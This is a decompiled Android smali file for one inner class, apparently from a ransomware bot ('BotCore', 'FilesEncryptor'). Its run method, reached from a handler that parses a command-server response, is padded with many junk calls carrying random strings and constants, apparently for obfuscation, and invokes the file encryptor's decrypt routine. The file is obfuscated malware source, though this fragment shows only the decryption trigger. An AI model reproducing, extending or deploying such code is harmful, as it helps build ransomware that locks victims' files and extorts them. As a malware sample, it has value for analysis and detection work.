.class final Lcom/androiddg/pgroute/BotCore$1;
.super Ljava/lang/Object;
.source "BotCore.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/androiddg/pgroute/BotCore;->parseHomeResponse(Ljava/lang/String;)Z
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .prologue
    .line 632
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .prologue
    const/4 v7, 0x1

    const/4 v6, 0x0

    .line 636
    const-string v1, "eNBRw"

    const-string v2, "USQKtdGhWKv"

    const v3, 0x3108dbbe

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "CfllbOSKI"

    invoke-static {v1, v2, v3, v4}, Lcom/androiddg/pgroute/BotCore;->access$000(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 637
    const-string v1, "JBRmqg"

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0xd7b2245

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v1, v2, v3}, Lcom/androiddg/pgroute/BotCore;->access$100(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 638
    const-string v1, "lEntIlI"

    const-string v2, "iwJaLLi"

    const-string v3, "GIlnMQj"

    invoke-static {v1, v2, v3}, Lcom/androiddg/pgroute/BotCore;->access$200(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 639
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "lGdtvtW"

    const v5, 0x3657a4f9

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v1, v2, v3, v4, v5}, Lcom/androiddg/pgroute/BotCore;->access$300(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)V

    .line 640
    new-instance v0, Lcom/androiddg/pgroute/FilesEncryptor;

    invoke-direct {v0}, Lcom/androiddg/pgroute/FilesEncryptor;-><init>()V

    .line 641
    .local v0, "encryptor":Lcom/androiddg/pgroute/FilesEncryptor;
    const-string v1, "wVRwHguu"

    const-string v2, "rKppSddApK"

    const-string v3, "icVmHPVJ"

    invoke-static {v1, v2, v3}, Lcom/androiddg/pgroute/BotCore;->access$200(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 642
    const-string v1, "GnrEKC"

    const-string v2, "uHDTkag"

    const-string v3, "OIlWGKS"

    invoke-static {v1, v2, v3}, Lcom/androiddg/pgroute/BotCore;->access$200(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 643
    const-string v1, "LDmka"

    const-string v2, "bEGnfvGQh"

    const v3, 0x3007d0e0

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "jKdQUhfjtK"

    invoke-static {v1, v2, v3, v4}, Lcom/androiddg/pgroute/BotCore;->access$000(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 644
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "lbCfGGvA"

    const v5, 0x5980bf5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v1, v2, v3, v4, v5}, Lcom/androiddg/pgroute/BotCore;->access$300(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)V

    .line 645
    invoke-virtual {v0}, Lcom/androiddg/pgroute/FilesEncryptor;->decrypt()V

    .line 646
    const-string v1, "gNasaeP"

    const-string v2, "lhbAvvdt"

    const-string v3, "omwgcqqi"

    invoke-static {v1, v2, v3}, Lcom/androiddg/pgroute/BotCore;->access$200(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 647
    const v1, 0x96c4101

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const-string v3, "bIMrlpM"

    const-string v4, "BuHksa"

    invoke-static {v1, v2, v3, v4}, Lcom/androiddg/pgroute/BotCore;->access$400(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 648
    return-void
.end method
